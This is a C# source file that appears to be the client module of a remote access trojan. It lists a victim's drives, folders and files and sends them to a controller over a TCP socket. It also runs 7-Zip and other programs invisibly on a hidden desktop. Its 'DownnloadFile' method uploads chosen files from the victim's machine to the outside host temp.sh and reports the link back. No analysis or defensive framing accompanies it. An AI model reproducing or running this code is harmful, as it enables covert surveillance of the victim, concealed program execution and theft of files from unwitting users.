using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using MessagePack;

namespace Client.HandlePacket
{
    internal class HandleFile
    {
        public static List<Copy> Copies = new List<Copy>();
        public static string ZipPath = Path.Combine(Path.GetTempPath(), "7-Zip\\7z.exe");
        private static string m_desktopName;

        public class Copy
        {
            public string HWID = null;
            public string FileCopy = null;
        }

        public static void GetDrivers(string Controler_HWID)
        {
            try
            {
                var allDrives = DriveInfo.GetDrives();

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "getDrivers";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                var sbDriver = new StringBuilder();
                foreach (var d in allDrives)
                    if (d.IsReady)
                        sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Error(Controler_HWID, ex.Message);
            }
        }

        public static void GetPath(string Controler_HWID, string path)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "getPath";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                var sbFolder = new StringBuilder();
                var sbFile = new StringBuilder();

                if (path == "DESKTOP") path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                if (path == "APPDATA")
                    path = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "AppData");

                if (path == "USER") path = Environment.GetEnvironmentVariable("USERPROFILE");

                if (path == "SYSTEM32") path = Environment.GetFolderPath(Environment.SpecialFolder.System);

                if (path == "TEMP") path = Path.GetTempPath();

                foreach (var folder in Directory.GetDirectories(path))
                    sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>" +
                                    new FileInfo(folder).LastWriteTime + "-=>");
                foreach (var file in Directory.GetFiles(path))
                    using (var ms = new MemoryStream())
                    {
                        GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" +
                                      Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length + "-=>" +
                                      new FileInfo(file).LastWriteTime + "-=>" + GetFileType(file) + "-=>");
                    }

                msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                msgpack.ForcePathObject("File").AsString = sbFile.ToString();
                msgpack.ForcePathObject("CurrentPath").AsString = path;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Error(Controler_HWID, ex.Message);
            }
        }


        private static string GetFileType(string Path)
        {
            try
            {
                var shinfo = new Native.SHFILEINFO();

                var flag = Native.SHGFI.SHGFI_ATTRIBUTES | Native.SHGFI.SHGFI_TYPENAME
                    ;
                Native.SHGetFileInfo(Path, 0, out shinfo, (uint) Marshal.SizeOf(typeof(Native.SHFILEINFO)), flag);
                return shinfo.szTypeName;
            }
            catch (Exception e)
            {
                return "ERROR: " + e.Message;
            }
        }

        private static Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") ||
                    file.EndsWith("bmp"))
                    using (var myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48,
                            () => false, IntPtr.Zero));
                    }

                using (var icon = Icon.ExtractAssociatedIcon(file))
                {
                    return icon.ToBitmap();
                }
            }
            catch
            {
                return new Bitmap(48, 48);
            }
        }

        public static void ZipCommandLine(string args, bool isZip, string location)
        {
            if (isZip)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "\"" + ZipPath + "\"",
                    Arguments = $"a -r \"{location}.zip\" {args} -y",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    ErrorDialog = false
                });
            else
                Process.Start(new ProcessStartInfo
                {
                    FileName = "\"" + ZipPath + "\"",
                    Arguments =
                        $"x \"{args}\" -o\"{args.Replace(Path.GetFileName(args), "_" + Path.GetFileNameWithoutExtension(args))}\" -y",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    ErrorDialog = false
                });
        }

        public static void Error(string Controler_HWID, string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileError";
            msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
            msgpack.ForcePathObject("Message").AsString = ex;
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }

        public static bool CheckForSevenZip()
        {
            try
            {
                if (File.Exists(ZipPath)) return true;

                return false;
            }
            catch
            {
                return false;
            }
        }


        public static void ExecuteNewDesktop(string path, string HWID)
        {
            var hOldDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadId());
            m_desktopName = HWID;

            var hNewDesktop = Native.CreateDesktop(m_desktopName,
                IntPtr.Zero, IntPtr.Zero, 0, Native.AccessRights, IntPtr.Zero);

            Native.SetThreadDesktop(hNewDesktop);
            CreateProcess(path, HWID);
            Native.SetThreadDesktop(hOldDesktop);
        }

        public static bool CreateProcess(string path, string HWID)
        {
            var si = new Native.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = HWID;

            var pi = new Native.PROCESS_INFORMATION();

            var result = Native.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, true,
                Native.NORMAL_PRIORITY_CLASS,
                IntPtr.Zero, null, ref si, ref pi);

            return result;
        }

        public void DownnloadFile(string file, string Controler_HWID)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            string filepath = file;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://temp.sh/" + Path.GetFileName(filepath));
            request.Method = "PUT";

            byte[] data = File.ReadAllBytes(filepath);
            using (Stream reqStream = request.GetRequestStream())
            {
                reqStream.Write(data, 0, data.Length);
                reqStream.Close();
            }

            HttpWebResponse resp = (HttpWebResponse)request.GetResponse();
            Stream stream = resp.GetResponseStream();
            using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
            {
                string result = reader.ReadToEnd();

                string message = file + Environment.NewLine + DateTime.Now + Environment.NewLine + result;
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Message";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("Message").AsString = message;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
        }
    }
}